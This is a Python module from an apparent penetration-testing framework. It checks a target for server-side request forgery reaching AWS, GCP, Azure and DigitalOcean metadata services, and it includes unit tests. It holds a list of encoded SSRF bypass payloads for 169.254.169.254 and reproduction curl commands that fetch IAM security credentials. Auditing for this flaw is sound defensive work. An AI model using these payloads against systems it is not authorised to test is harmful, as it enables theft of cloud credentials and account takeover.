"""Cloud Metadata SSRF — test for SSRF to cloud provider metadata endpoints.

Tests:
  - AWS IMDSv1 (169.254.169.254 without token)
  - AWS IMDSv2 detection
  - GCP metadata (metadata.google.internal)
  - Azure IMDS (169.254.169.254 with Metadata: true header)
  - DigitalOcean metadata
  - Alibaba Cloud metadata
"""
from __future__ import annotations

import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))

from common.base_module import BaseModule, ModuleResult
from common.evidence import Evidence
from common.finding import Severity

CVSS_IMDSV1      = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N"
CVSS40_IMDSV1    = "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N"
CVSS_METADATA    = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
CVSS40_METADATA  = "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N"

METADATA_ENDPOINTS = [
    {
        "name": "AWS IMDSv1",
        "url": "http://169.254.169.254/latest/meta-data/",
        "headers": {},
        "indicators": ["ami-id", "instance-id", "instance-type", "public-hostname"],
        "critical": True,
    },
    {
        "name": "GCP",
        "url": "http://metadata.google.internal/computeMetadata/v1/",
        "headers": {"Metadata-Flavor": "Google"},
        "indicators": ["project", "instance", "attributes"],
        "critical": True,
    },
    {
        "name": "Azure IMDS",
        "url": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "headers": {"Metadata": "true"},
        "indicators": ["compute", "network", "vmId"],
        "critical": True,
    },
    {
        "name": "DigitalOcean",
        "url": "http://169.254.169.254/metadata/v1/",
        "headers": {},
        "indicators": ["droplet_id", "hostname", "region"],
        "critical": False,
    },
]

# SSRF bypass payloads for the metadata IP
SSRF_BYPASSES = [
    "http://169.254.169.254/latest/meta-data/",
    "http://[::ffff:169.254.169.254]/latest/meta-data/",
    "http://0xa9fea9fe/latest/meta-data/",
    "http://2852039166/latest/meta-data/",
    "http://169.254.169.254.nip.io/latest/meta-data/",
    "http://0251.0376.0251.0376/latest/meta-data/",
]


class CloudMetadata(BaseModule):
    """Cloud metadata SSRF auditor."""

    NAME        = "cloud_metadata"
    DESCRIPTION = "Cloud SSRF: AWS IMDSv1/v2, GCP, Azure, DigitalOcean metadata endpoint access"
    PHASE       = 5
    TAGS        = ["cloud", "ssrf", "metadata", "cwe-918", "owasp-a10"]

    async def run(self) -> ModuleResult:
        start = time.monotonic()
        target = self.config.target

        if not self.check_scope(target):
            return self._make_result(start, skipped=True, skip_reason="out of scope")

        self.log.info("Testing cloud metadata SSRF on %s", target)

        import aiohttp
        async with aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=8),
            connector=aiohttp.TCPConnector(ssl=False),
        ) as session:
            # Direct metadata access (are we running on a cloud instance?)
            for endpoint in METADATA_ENDPOINTS:
                await self.rate_limit()
                try:
                    async with session.get(
                        endpoint["url"], headers=endpoint["headers"]
                    ) as resp:
                        if resp.status != 200:
                            continue
                        body = await resp.text()
                        if any(ind in body for ind in endpoint["indicators"]):
                            self._report_metadata(endpoint, body, "direct", target)
                except Exception:
                    pass

            # SSRF via target web app (if it has URL parameters)
            await self._test_ssrf_via_target(session, target)

        return self._make_result(start)

    async def _test_ssrf_via_target(self, session, target: str) -> None:
        """Test SSRF via common URL parameters on the target."""
        ssrf_params = ["url", "redirect", "uri", "path", "next", "data", "reference",
                       "site", "html", "val", "validate", "domain", "callback",
                       "return", "page", "feed", "host", "port", "to", "out",
                       "view", "dir", "show", "navigation", "open", "file", "content",
                       "document", "folder", "pg", "style", "pdf", "template", "php_path",
                       "doc", "img", "src"]

        for param in ssrf_params[:10]:
            for bypass_url in SSRF_BYPASSES[:3]:
                await self.rate_limit()
                try:
                    test_url = f"{target}?{param}={bypass_url}"
                    async with session.get(test_url, allow_redirects=False) as resp:
                        body = await resp.text()
                        aws_indicators = ["ami-id", "instance-id", "iam"]
                        if any(ind in body for ind in aws_indicators):
                            self._report_ssrf(param, bypass_url, body, target)
                            return  # One finding is enough
                except Exception:
                    pass

    def _report_metadata(
        self, endpoint: dict, body: str, method: str, target: str
    ) -> None:
        ev = Evidence(
            request_raw=f"GET {endpoint['url']}",
            response_raw=body[:3000],
            extra={
                "provider": endpoint["name"],
                "method": method,
            },
        )
        self.new_finding(
            title=f"Cloud Metadata Accessible — {endpoint['name']}",
            severity=Severity.CRITICAL if endpoint["critical"] else Severity.HIGH,
            description=(
                f"{endpoint['name']} metadata endpoint is accessible. "
                "This exposes:\n"
                "  - IAM role credentials (temporary access keys)\n"
                "  - Instance identity documents\n"
                "  - User-data scripts (often contain secrets)\n"
                "  - Network configuration\n"
                "  - SSH public keys"
            ),
            reproduction_steps=[
                f"curl {endpoint['url']}",
                f"curl {endpoint['url']}iam/security-credentials/",
            ],
            remediation=(
                "AWS: Enforce IMDSv2 (require PUT token):\n"
                "  aws ec2 modify-instance-metadata-options --instance-id i-xxx "
                "--http-tokens required\n"
                "GCP: Use metadata concealment or restrict IAM scopes\n"
                "Azure: Use managed identities with least-privilege roles"
            ),
            references=["CWE-918", "MITRE T1552.005"],
            evidence=ev,
            cvss_v31_vector=CVSS_IMDSV1,
            cvss_v40_vector=CVSS40_IMDSV1,
            mitre_attack=["TA0006/T1552.005"],
            target=target,
        )

    def _report_ssrf(
        self, param: str, bypass_url: str, body: str, target: str
    ) -> None:
        ev = Evidence(
            request_raw=f"GET {target}?{param}={bypass_url}",
            response_raw=body[:3000],
            extra={"parameter": param, "ssrf_url": bypass_url},
        )
        self.new_finding(
            title=f"SSRF to Cloud Metadata via '{param}' Parameter",
            severity=Severity.CRITICAL,
            description=(
                f"Server-Side Request Forgery via '{param}' parameter fetches cloud metadata. "
                "Attacker can steal IAM credentials, access internal services, and pivot to "
                "other cloud resources."
            ),
            reproduction_steps=[
                f"curl '{target}?{param}={bypass_url}'",
                f"curl '{target}?{param}=http://169.254.169.254/latest/meta-data/iam/security-credentials/'",
            ],
            remediation=(
                "1. Validate and whitelist allowed URLs/domains\n"
                "2. Block requests to 169.254.169.254 at the application level\n"
                "3. Enforce IMDSv2 on all EC2 instances\n"
                "4. Use firewall rules to block metadata access from application subnets"
            ),
            references=["CWE-918", "OWASP A10:2021"],
            evidence=ev,
            cvss_v31_vector=CVSS_IMDSV1,
            cvss_v40_vector=CVSS40_IMDSV1,
            target=target,
        )


class TestCloudMetadata:
    def test_endpoints(self) -> None:
        assert len(METADATA_ENDPOINTS) >= 3
        names = [e["name"] for e in METADATA_ENDPOINTS]
        assert "AWS IMDSv1" in names
        assert "GCP" in names
        assert "Azure IMDS" in names

    def test_ssrf_bypasses(self) -> None:
        assert any("169.254.169.254" in b for b in SSRF_BYPASSES)
        assert any("0xa9fea9fe" in b for b in SSRF_BYPASSES)

    def test_cvss(self) -> None:
        assert CVSS_IMDSV1.startswith("CVSS:3.1")
        assert CVSS40_IMDSV1.startswith("CVSS:4.0")

    def test_phase(self) -> None:
        assert CloudMetadata.PHASE == 5
